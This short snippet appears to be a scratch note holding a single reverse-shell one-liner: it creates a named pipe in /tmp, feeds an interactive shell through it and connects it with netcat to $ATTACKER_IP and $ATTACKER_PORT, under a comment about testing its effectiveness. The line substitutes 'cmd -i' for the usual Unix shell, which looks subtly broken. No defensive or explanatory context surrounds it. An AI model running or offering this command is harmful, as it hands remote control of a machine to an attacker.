# Let's try the effectiveness of this some more

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cmd -i 2>&1|nc $ATTACKER_IP $ATTACKER_PORT >/tmp/f
